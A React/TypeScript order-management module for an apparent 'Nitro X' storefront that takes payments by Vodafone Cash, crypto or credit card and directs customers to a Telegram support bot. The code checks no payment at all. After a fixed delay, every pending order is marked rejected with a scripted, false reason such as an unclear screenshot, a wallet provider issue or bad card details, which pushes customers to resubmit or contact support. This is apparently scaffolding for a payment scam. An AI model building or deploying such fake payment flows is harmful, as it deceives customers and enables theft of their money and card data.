import {
  createContext,
  useCallback,
  useContext,
  useEffect,
  useMemo,
  useRef,
  useState,
  type ReactNode,
} from "react";
import { toast } from "sonner";

const STORAGE_KEY = "nitro-x-orders";
export const ORDER_SUPPORT_URL = "https://t.me/NitroX_AppBot";
export const ORDER_SUPPORT_EVENT = "nitro-x:open-support";

export const paymentMethodLabels = {
  vodafone: "Vodafone Cash",
  crypto: "Crypto",
  card: "Credit Card",
} as const;

export type PaymentMethodKey = keyof typeof paymentMethodLabels;
export type DeliveryMethodKey = "own-account" | "ready-made";
export type OrderProviderState = "pending" | "rejected" | "confirmed";

export const paymentReviewRules: Record<
  PaymentMethodKey,
  {
    delayMs: number;
    pendingStatus: string;
    pendingTitle: string;
    pendingDescription: string;
    supportNote: string;
    finalStatus: string;
    finalTitle: string;
    finalDescription: string;
    finalSupportNote: string;
    toastTitle: string;
    toastDescription: string;
  }
> = {
  vodafone: {
    delayMs: 180000,
    pendingStatus: "Awaiting Review",
    pendingTitle: "Vodafone Cash Submitted",
    pendingDescription:
      "Your Vodafone Cash transfer is under review. Please keep your sender number and screenshot ready while we verify the payment.",
    supportNote: "If verification fails, support may ask you to resend a clearer screenshot.",
    finalStatus: "Rejected",
    finalTitle: "Screenshot not clear enough",
    finalDescription:
      "We could not verify your Vodafone Cash transfer because the uploaded screenshot was not clear enough to review. Please contact support and resend a clearer screenshot.",
    finalSupportNote:
      "Open support and share your Order ID together with a clear Vodafone Cash screenshot.",
    toastTitle: "Vodafone Cash review failed",
    toastDescription: "The screenshot was not clear enough. Please contact support with your Order ID.",
  },
  crypto: {
    delayMs: 60000,
    pendingStatus: "Awaiting Confirmation",
    pendingTitle: "Crypto Payment Pending",
    pendingDescription:
      "Your crypto payment is being checked with the wallet provider. This usually updates within about 1 minute.",
    supportNote: "Keep your TXID ready in case support asks for it.",
    finalStatus: "Failed",
    finalTitle: "Wallet provider issue",
    finalDescription:
      "Your crypto payment could not be confirmed because of a temporary wallet provider issue. Please contact support or try again later.",
    finalSupportNote: "Open support and share your Order ID and TXID for faster assistance.",
    toastTitle: "Crypto payment failed",
    toastDescription: "A wallet provider issue prevented confirmation. Please contact support.",
  },
  card: {
    delayMs: 60000,
    pendingStatus: "Processing",
    pendingTitle: "Card Payment Processing",
    pendingDescription:
      "Your card payment is being securely processed. Please keep this page open while the provider returns the final result.",
    supportNote: "If the payment does not complete, contact support with your Order ID.",
    finalStatus: "Declined",
    finalTitle: "Card payment declined",
    finalDescription:
      "Your payment was declined because there is an issue with your card details. Please check them and try again, or use another payment method.",
    finalSupportNote: "Open support if you need help selecting another payment option.",
    toastTitle: "❌ Payment Declined: There is an issue with your card details.",
    toastDescription: "Please review your card details or choose another payment method.",
  },
};

export interface OrderRecord {
  id: string;
  platformId: string;
  platformName: string;
  planName: string;
  amount: number;
  paymentMethod: PaymentMethodKey;
  deliveryMethod: DeliveryMethodKey;
  customerEmail: string;
  submittedAt: string;
  updatedAt: string;
  status: string;
  statusTitle: string;
  statusDescription: string;
  supportNote: string;
  providerState: OrderProviderState;
  unread: boolean;
}

interface CreateOrderInput {
  platformId: string;
  platformName: string;
  planName: string;
  amount: number;
  paymentMethod: PaymentMethodKey;
  deliveryMethod: DeliveryMethodKey;
  customerEmail: string;
}

interface OrderCenterContextValue {
  orders: OrderRecord[];
  unreadCount: number;
  latestOrder: OrderRecord | null;
  createOrder: (input: CreateOrderInput) => OrderRecord;
  markAsRead: (orderId: string) => void;
  markAllAsRead: () => void;
  getOrderById: (orderId: string) => OrderRecord | undefined;
}

const OrderCenterContext = createContext<OrderCenterContextValue | undefined>(undefined);

const generateOrderId = () => {
  const timestamp = Date.now().toString().slice(-5);
  const random = Math.floor(100 + Math.random() * 900);
  return `ORD-${timestamp}${random}`;
};

export const formatOrderDate = (isoDate: string) =>
  new Intl.DateTimeFormat("en-US", {
    dateStyle: "medium",
    timeStyle: "short",
  }).format(new Date(isoDate));

export const getPaymentReviewDelay = (paymentMethod: PaymentMethodKey) =>
  paymentReviewRules[paymentMethod].delayMs;

export const openSupportChat = (orderId?: string | null) => {
  if (typeof window === "undefined") {
    return;
  }

  window.dispatchEvent(
    new CustomEvent(ORDER_SUPPORT_EVENT, {
      detail: { orderId: orderId ?? null },
    }),
  );
};

const needsFollowUp = (order: OrderRecord) => order.providerState === "pending";

export const OrderCenterProvider = ({ children }: { children: ReactNode }) => {
  const [orders, setOrders] = useState<OrderRecord[]>([]);
  const timersRef = useRef<Record<string, number>>({});

  const markAsRead = useCallback((orderId: string) => {
    setOrders((prev) => prev.map((order) => (order.id === orderId ? { ...order, unread: false } : order)));
  }, []);

  const markAllAsRead = useCallback(() => {
    setOrders((prev) => prev.map((order) => ({ ...order, unread: false })));
  }, []);

  const finalizeOrder = useCallback((orderId: string) => {
    if (timersRef.current[orderId]) {
      window.clearTimeout(timersRef.current[orderId]);
      delete timersRef.current[orderId];
    }

    let updatedOrder: OrderRecord | null = null;

    setOrders((prev) =>
      prev.map((order) => {
        if (order.id !== orderId || !needsFollowUp(order)) {
          return order;
        }

        const rule = paymentReviewRules[order.paymentMethod];
        updatedOrder = {
          ...order,
          status: rule.finalStatus,
          statusTitle: rule.finalTitle,
          statusDescription: rule.finalDescription,
          supportNote: rule.finalSupportNote,
          providerState: "rejected",
          unread: true,
          updatedAt: new Date().toISOString(),
        };

        return updatedOrder;
      }),
    );

    if (updatedOrder) {
      const rule = paymentReviewRules[updatedOrder.paymentMethod];

      if (updatedOrder.paymentMethod === "card") {
        toast.error(rule.toastTitle, {
          description: rule.toastDescription,
        });
        return;
      }

      toast.error(rule.toastTitle, {
        description: `${updatedOrder.id} • ${rule.toastDescription}`,
      });
    }
  }, []);

  const scheduleReviewTimeout = useCallback(
    (order: OrderRecord) => {
      if (typeof window === "undefined" || !needsFollowUp(order) || timersRef.current[order.id]) {
        return;
      }

      const elapsed = Date.now() - new Date(order.submittedAt).getTime();
      const remaining = getPaymentReviewDelay(order.paymentMethod) - elapsed;

      if (remaining <= 0) {
        finalizeOrder(order.id);
        return;
      }

      timersRef.current[order.id] = window.setTimeout(() => {
        finalizeOrder(order.id);
      }, remaining);
    },
    [finalizeOrder],
  );

  const createOrder = useCallback(
    (input: CreateOrderInput) => {
      const timestamp = new Date().toISOString();
      const rule = paymentReviewRules[input.paymentMethod];
      const order: OrderRecord = {
        id: generateOrderId(),
        platformId: input.platformId,
        platformName: input.platformName,
        planName: input.planName,
        amount: input.amount,
        paymentMethod: input.paymentMethod,
        deliveryMethod: input.deliveryMethod,
        customerEmail: input.customerEmail,
        submittedAt: timestamp,
        updatedAt: timestamp,
        status: rule.pendingStatus,
        statusTitle: rule.pendingTitle,
        statusDescription: rule.pendingDescription,
        supportNote: rule.supportNote,
        providerState: "pending",
        unread: true,
      };

      setOrders((prev) => [order, ...prev].slice(0, 12));
      scheduleReviewTimeout(order);

      toast.success("Order submitted successfully", {
        description: `${order.id} • ${paymentMethodLabels[input.paymentMethod]} • ${rule.pendingStatus}`,
      });

      return order;
    },
    [scheduleReviewTimeout],
  );

  const getOrderById = useCallback(
    (orderId: string) => orders.find((order) => order.id === orderId),
    [orders],
  );

  useEffect(() => {
    if (typeof window === "undefined") {
      return;
    }

    const storedOrders = window.localStorage.getItem(STORAGE_KEY);

    if (!storedOrders) {
      return;
    }

    try {
      const parsed = JSON.parse(storedOrders) as OrderRecord[];
      setOrders(Array.isArray(parsed) ? parsed : []);
    } catch {
      setOrders([]);
    }
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") {
      return;
    }

    window.localStorage.setItem(STORAGE_KEY, JSON.stringify(orders));
    orders.forEach(scheduleReviewTimeout);
  }, [orders, scheduleReviewTimeout]);

  useEffect(() => {
    return () => {
      Object.values(timersRef.current).forEach((timerId) => window.clearTimeout(timerId));
    };
  }, []);

  const value = useMemo<OrderCenterContextValue>(
    () => ({
      orders,
      unreadCount: orders.filter((order) => order.unread).length,
      latestOrder: orders[0] ?? null,
      createOrder,
      markAsRead,
      markAllAsRead,
      getOrderById,
    }),
    [createOrder, getOrderById, markAllAsRead, markAsRead, orders],
  );

  return <OrderCenterContext.Provider value={value}>{children}</OrderCenterContext.Provider>;
};

export const useOrderCenter = () => {
  const context = useContext(OrderCenterContext);

  if (!context) {
    throw new Error("useOrderCenter must be used within an OrderCenterProvider");
  }

  return context;
};
